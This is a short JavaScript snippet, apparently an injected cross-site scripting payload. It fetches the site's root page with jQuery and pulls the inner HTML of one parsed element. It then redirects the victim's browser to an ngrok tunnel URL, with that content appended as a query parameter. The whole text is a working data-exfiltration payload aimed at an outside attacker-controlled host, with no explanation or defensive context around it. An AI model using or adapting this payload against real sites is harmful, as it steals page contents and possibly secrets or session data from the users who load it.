$.get('/', (data) => {
  var value = $.parseHTML(data)[3].innerHTML;
  document.location='https://e2fa34d0bf0b.ngrok.io/oops?c='+value;
});
